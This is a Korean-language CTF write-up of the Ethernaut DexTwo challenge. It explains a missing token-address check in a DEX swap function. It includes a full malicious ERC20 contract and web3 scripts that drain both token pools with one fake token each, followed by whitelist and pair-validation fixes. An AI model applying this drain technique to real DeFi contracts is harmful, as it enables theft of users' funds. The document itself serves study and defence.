# DexTwo - Ethernaut Writeup

## 🎯 문제 개요

DexTwo는 이전 Dex 문제의 수정된 버전으로, **입력 검증 부족 취약점**을 이용하는 문제입니다. 목표는 DexTwo 컨트랙트에서 token1과 token2의 **모든 잔액을 탈취**하는 것입니다.

### 초기 조건
- Player: token1 10개, token2 10개 보유
- DexTwo: token1 100개, token2 100개 보유

## 📋 코드 분석

### 핵심 취약점 - swap 함수
```solidity
function swap(address from, address to, uint256 amount) public {
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint256 swapAmount = getSwapAmount(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
}
```

**취약점**: `from`과 `to` 매개변수가 `token1` 또는 `token2`인지 검증하지 않습니다!

### getSwapAmount 공식
```solidity
function getSwapAmount(address from, address to, uint256 amount) public view returns (uint256) {
    return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
}
```

## 🚀 공격 전략

**핵심 아이디어**: 악의적인 ERC20 토큰을 생성하여 조작된 잔액 비율로 모든 토큰을 탈취

1. **악의적인 토큰 생성**: 충분한 공급량을 가진 ERC20 토큰 배포
2. **DexTwo에 소량 전송**: 악의적인 토큰 1개를 DexTwo로 전송
3. **비율 조작 이용**: 1:100 비율로 모든 정상 토큰 탈취

## 🛠️ 실제 공격 과정

### 1단계: 악의적인 토큰 배포 (Remix 사용)
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MaliciousToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    
    string public name = "EvilToken";
    string public symbol = "EVIL";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    
    constructor() {
        totalSupply = 1000 * 10**18;
        balanceOf[msg.sender] = totalSupply;
    }
    
    function transfer(address to, uint256 amount) public returns (bool) {
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
    
    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
    
    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        require(balanceOf[from] >= amount, "Insufficient balance");
        require(allowance[from][msg.sender] >= amount, "Insufficient allowance");
        
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        allowance[from][msg.sender] -= amount;
        return true;
    }
}
```

### 2단계: Token1 탈취
```javascript
// 1. 악의적인 토큰 주소 (Remix에서 배포한 주소)
const malTokenAddress = "0x4ee6ecad1c2dae9f525404de8555724e3c35d07b";

// 2. 악의적인 토큰 컨트랙트 인스턴스
const malTokenABI = [
    {
        "inputs": [{"name": "to", "type": "address"}, {"name": "amount", "type": "uint256"}],
        "name": "transfer",
        "outputs": [{"type": "bool"}],
        "type": "function"
    },
    {
        "inputs": [{"name": "spender", "type": "address"}, {"name": "amount", "type": "uint256"}],
        "name": "approve", 
        "outputs": [{"type": "bool"}],
        "type": "function"
    }
];

const malToken = new web3.eth.Contract(malTokenABI, malTokenAddress);

// 3. DexTwo에 악의적인 토큰 1개 전송
await malToken.methods.transfer(contract.address, 1).send({from: player});

// 4. DexTwo에 악의적인 토큰 사용 승인
await malToken.methods.approve(contract.address, 1).send({from: player});

// 5. token1 주소 확인
const token1Address = await contract.token1();

// 6. 악의적인 토큰 1개를 token1 100개와 스왑
// swapAmount = (1 * 100) / 1 = 100
await contract.swap(malTokenAddress, token1Address, 1);
```

### 3단계: Token2 탈취
```javascript
// token2 주소 확인
const token2Address = await contract.token2();

// DexTwo에 다시 악의적인 토큰 1개 전송
await malToken.methods.transfer(contract.address, 1).send({from: player});

// 승인
await malToken.methods.approve(contract.address, 1).send({from: player});

// token2 100개 탈취
await contract.swap(malTokenAddress, token2Address, 1);
```

### 4단계: 공격 검증
```javascript
// DexTwo의 잔액 확인 (모두 0이어야 함)
const token1Balance = await contract.balanceOf(token1Address, contract.address);
const token2Balance = await contract.balanceOf(token2Address, contract.address);

console.log("DexTwo token1 balance:", token1Balance.toString()); // 0
console.log("DexTwo token2 balance:", token2Balance.toString()); // 0

// 공격 성공!
```

## 🎊 공격 성공 결과

- **DexTwo token1 잔액**: 0
- **DexTwo token2 잔액**: 0  
- **Player token1 잔액**: 110 (원래 10 + 탈취한 100)
- **Player token2 잔액**: 110 (원래 10 + 탈취한 100)

## 🔍 공격 원리 분석

### 핵심 수식
```
swapAmount = (amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this))
```

**공격 시나리오**:
- `amount = 1` (악의적인 토큰)
- `IERC20(to).balanceOf(address(this)) = 100` (정상 토큰)
- `IERC20(from).balanceOf(address(this)) = 1` (악의적인 토큰)
- **결과**: `swapAmount = (1 × 100) / 1 = 100`

→ **악의적인 토큰 1개로 정상 토큰 100개 탈취!**

## 🛡️ 방어 방법

### 1. 토큰 화이트리스트
```solidity
modifier onlyValidTokens(address from, address to) {
    require(from == token1 || from == token2, "Invalid from token");
    require(to == token1 || to == token2, "Invalid to token");
    require(from != to, "Cannot swap same token");
    _;
}

function swap(address from, address to, uint256 amount) public onlyValidTokens(from, to) {
    // ...
}
```

### 2. 페어 검증
```solidity
mapping(address => mapping(address => bool)) public validPairs;

constructor() {
    validPairs[token1][token2] = true;
    validPairs[token2][token1] = true;
}

function swap(address from, address to, uint256 amount) public {
    require(validPairs[from][to], "Invalid trading pair");
    // ...
}
```

### 3. 엄격한 입력 검증
```solidity
function swap(address from, address to, uint256 amount) public {
    require(from != address(0) && to != address(0), "Invalid addresses");
    require(from == token1 || from == token2, "Invalid from token");
    require(to == token1 || to == token2, "Invalid to token");
    require(from != to, "Same token");
    // ...
}
```

## 📚 핵심 교훈

1. **입력 검증의 중요성**: 모든 사용자 입력은 철저히 검증해야 함
2. **화이트리스트 방식**: 허용된 토큰만 거래 가능하도록 제한
3. **비즈니스 로직 보안**: AMM의 가격 결정 메커니즘 보안 중요
4. **외부 컨트랙트 신뢰 문제**: 임의의 ERC20 토큰과의 상호작용 위험성

## 🔗 관련 취약점들

- **Input Validation Bypass**
- **Arbitrary Token Interaction**
- **AMM Price Manipulation**
- **Missing Access Control**

이 문제는 실제 DeFi 프로토콜에서 발생할 수 있는 **입력 검증 부족 취약점**의 심각성을 보여주는 훌륭한 예시입니다.